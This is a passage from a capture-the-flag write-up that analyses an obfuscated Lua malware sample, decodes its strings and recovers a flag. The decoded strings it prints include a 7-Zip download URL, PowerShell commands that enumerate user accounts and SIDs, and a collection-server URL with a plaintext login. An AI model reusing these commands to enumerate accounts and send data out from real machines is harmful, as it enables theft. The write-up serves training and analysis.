      local j = r() % (i + 1)
      perm[i], perm[j] = perm[j], perm[i]
    end
  end
  local dec_map = {}
  for n = 0, 15 do
    local idx = permute and perm[n] or n
    dec_map[T[idx + 1]] = n
  end
  t = (t or ""):gsub("%s+", "")
  local out, n, i, step = {}, #t, 1, toklen * 2
  local ks
  if key_on then
    do
      local r = M(S(tostring(k) .. "|xor"))
      function ks()
        local v = r() % 256
        return (v - v % 16) / 16, v % 16
      end
    end
  end
  while n >= i + step - 1 do
    local a = t:sub(i, i + toklen - 1)
    local b = t:sub(i + toklen, i + step - 1)
    local hi, lo = dec_map[a], dec_map[b]
    if not hi or not lo then
      break
    end
    if ks then
      local kh, kl = ks()
      hi = X(hi, kh)
      lo = X(lo, kl)
    end
    out[#out + 1] = string.char(hi * 16 + lo)
    i = i + step
  end
  return table.concat(out)
end

7. I then, again, had AI shamelessly write me a python script to extract all of the encoded strings. 

	┌──(ctf㉿kali)-[~/CTF/huntress2025/malware/my_hawaii_vacation]
	└─$ python parse.py -o 1.lua.strings.txt 1.lua 
	Successfully extracted 287 strings to 1.lua.strings.txt

8. Having the encoded strings now extracted into [1.lua.strings.txt] and wrapped in "print()" functions I can decode them online 
   via: https://glot.io/snippets/fnarug0ca6 [decoded-1.png]

   a. Reviewing the decoded strings some detail below starts to emerge (Note: cleaned up some garbage data)

   	    https://7-zip.org/a/7zr.exe
	    COMPUTERNAME
	    _
	    .mp3
	    cmd /c
	    -p"
	    "
	    \*
	    >nul
	    2>&1
	    powershell.exe -NoProfile -Command "Get-CimInstance -ClassName Win32_UserAccount | Where-Object { Test-Path (Join-Path -Path 'C:\Users' -ChildPath $_.Name) } | Select-Object Name,SID | Format-List"
	    r
	    *all
	    Name
	    SID
	    \
	    COMPUTERNAME
	    _
	    .log
	    powershell.exe -NoProfile -Command "(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\
	    ').Sid > 
	    "
	    http://10.1.68.196/a9GeV5t1FFrTqNXUN2vaq93mNKfSDqESBn2IlNiGRvh6xYUsQFEk4rRo8ajGA7fiEDe1ugdmAbCeqXw6y0870YkBqU1hrVTzgDIHZplop8WAWTiS3vQPOdNP
	    prometheus
	    PA4tqS5NHFpkQwumsd3D92cb

9. Navigating to the URL shown, enter the username and password underneath [download-1.png]

	a. Download the two files available: "WINDOWS11-Administrator.log", "WINDOWS11-Administrator.zip"

10. The zip archive is password protected, but reviewing the extracted code above, we can see that there is a 7zip extraction sequence, and the Powershell
    command looks to query the current user's SID. In this case, the user who detonated the malware was the local Administrator.

    a. Reviewing [WINDOWS11-Administrator.log] we can determine that these numbers appear to be a SID. 
    b. Shamelessly asking AI to encode these numbers back to an Administrator SID we get: 

    	Parsing the bytes correctly:

		Byte 0: 1 = Revision
		Byte 1: 5 = Sub-authority count
		Bytes 2-7: [0,0,0,0,0,5] = Authority (BIG-endian) = 5 (NT Authority)

		5 Sub-authorities (4 bytes each, LITTLE-endian):

		[21, 0, 0, 0] = 21 + (0×256) = 21
		[18, 239, 154, 226] = 18 + (239×256) + (154×65536) + (226×16777216)
		= 18 + 61184 + 10092544 + 3791650816 = 3801804562
		[242, 155, 126, 245] = 242 + (155×256) + (126×65536) + (245×16777216)
		= 242 + 39680 + 8257536 + 4110417920 = 4118715378
		[147, 116, 180, 120] = 147 + (116×256) + (180×65536) + (120×16777216)
		= 147 + 29696 + 11796480 + 2013265920 = 2025092243
		[244, 1, 0, 0] = 244 + (1×256) = 500

		Correct SID:
		S-1-5-21-3801804562-4118715378-2025092243-500
		Thank you for the correction! This is indeed the Administrator account (RID 500) for a specific Windows domain.

11. Using that SID as the password, we can extract the archive and find the flag from \Desktop\flag.txt [flag-1.png]

Flag: flag{0a741a06d3b8227f75773e3195e1d641}



